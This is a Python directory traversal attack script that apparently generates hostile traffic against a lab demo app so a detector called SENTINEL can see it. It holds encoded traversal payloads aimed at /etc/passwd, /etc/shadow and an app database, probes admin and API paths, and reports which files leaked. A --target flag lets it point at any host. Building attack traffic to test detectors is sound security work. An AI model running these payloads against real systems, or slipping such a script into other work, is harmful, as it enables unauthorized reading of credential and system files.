"""Directory traversal attack against the demo app.

Sends HTTP requests with path traversal payloads to extract sensitive
files like /etc/passwd. Generates real traffic the scanner pushes into
SENTINEL. Note: the recon detector fires on TCP-level probes (SYN/RST),
not HTTP enumeration — this attack will not trigger it.

Usage: python -m attacks.traversal [--target http://demo-app:5000]
"""

from __future__ import annotations

import argparse
import time
from urllib import error, request

TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "../../etc/shadow",
    "../../../etc/passwd",
    "%2e%2e/%2e%2e/etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "....//....//etc/passwd",
    "..\\..\\etc\\passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

SENSITIVE_PATHS = [
    "/search?q=../../etc/passwd",
    "/search?q=../../etc/shadow",
    "/search?q=../../../etc/passwd",
    "/search?q=../../app.db",
    "/search?q=../../apps/vulnerable/blocklist.jsonl",
    "/admin/users.json",
    "/api/items",
]


def run(target: str, delay: float = 0.2, rounds: int = 2) -> int:
    target = target.rstrip("/")
    total = (len(TRAVERSAL_PAYLOADS) + len(SENSITIVE_PATHS)) * rounds
    print(
        f"[traversal] attacking {target} — {len(TRAVERSAL_PAYLOADS)} "
        f"traversals + {len(SENSITIVE_PATHS)} paths x{rounds} rounds ({total} requests)"
    )

    leaked_count = 0
    for round_idx in range(rounds):
        # Path traversal via search parameter
        for payload in TRAVERSAL_PAYLOADS:
            url = f"{target}/search?q={payload}"
            try:
                resp = request.urlopen(request.Request(url), timeout=5)
                code = resp.getcode()
                body = resp.read().decode(errors="replace")[:200]
            except error.HTTPError as e:
                code = e.code
                body = ""
            except Exception:
                code = 0
                body = ""
            leaked = "root:" in body or "password" in body.lower()
            if leaked:
                leaked_count += 1
            print(
                f"  round {round_idx + 1}  traverse={payload[:35]:35s}  "
                f"status={code}  leaked={leaked}"
            )
            time.sleep(delay)

        # Sensitive path enumeration
        for path in SENSITIVE_PATHS:
            url = f"{target}{path}"
            try:
                resp = request.urlopen(request.Request(url), timeout=5)
                code = resp.getcode()
                body = resp.read().decode(errors="replace")[:100]
            except error.HTTPError as e:
                code = e.code
                body = ""
            except Exception:
                code = 0
                body = ""
            has_data = len(body) > 50
            print(f"  round {round_idx + 1}  path={path[:35]:35s}  status={code}  data={has_data}")
            time.sleep(delay)

    print(f"[traversal] done: {total} requests, {leaked_count} files leaked")
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="http://127.0.0.1:5000")
    parser.add_argument("--delay", type=float, default=0.2)
    parser.add_argument("--rounds", type=int, default=2)
    args = parser.parse_args()
    return run(args.target, delay=args.delay, rounds=args.rounds)


if __name__ == "__main__":
    raise SystemExit(main())
